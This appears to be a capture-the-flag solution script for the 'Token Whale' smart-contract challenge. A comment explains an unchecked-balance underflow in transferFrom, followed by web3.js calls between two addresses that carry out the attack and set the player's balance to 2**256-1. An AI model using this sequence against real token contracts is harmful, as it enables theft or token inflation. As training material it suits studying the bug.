/*
	The 'transferFrom' function is vulnerable since it doesn't check that the 'balanceOf(msg.sender)' is sufficient to make the transfer (only the 'balanceOf(from)' which we can control).
	Hence the setup for exploiting this vulnerability goes like this : 
		* Player -> approve(player, 1000) => This allow the player to use the 'transferFrom' function by setting it's own allowance
		* Player -> transferFrom(player, dummy, 1000) => This empties the balance of the player to another address (which we control)
		* Dummy  -> approve(player, 1) => The other address approves the player for 1 token
		* Player -> transferFrom(dummy, dummy, 1) => The player spends the token again but this time with the 'dummy' as the source since this is where the funds are stored
	This will trigger an underflow in the '_transfer' function causing the player's balance to be 2**256-1 (more than enough for completing the challenge).  
*/
player = "0x164f58B4CdDd3D5fD430BeA9aA22D804157b8d44"
dummy = "0x4472822906f9F33061456718acc4653C12621A3e"

abi_token_whale = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"isComplete","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"_player","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"}]
contract_token_whale = new web3.eth.Contract(abi_token_whale, challenge_contract_address)

await contract_token_whale.methods.approve(player, 1000).send({"from":player})
await contract_token_whale.methods.transferFrom(player, dummy, 1000).send({"from":player})
await contract_token_whale.methods.approve(player, 1).send({"from":dummy})
await contract_token_whale.methods.transferFrom(dummy, dummy, 1).send({"from":player})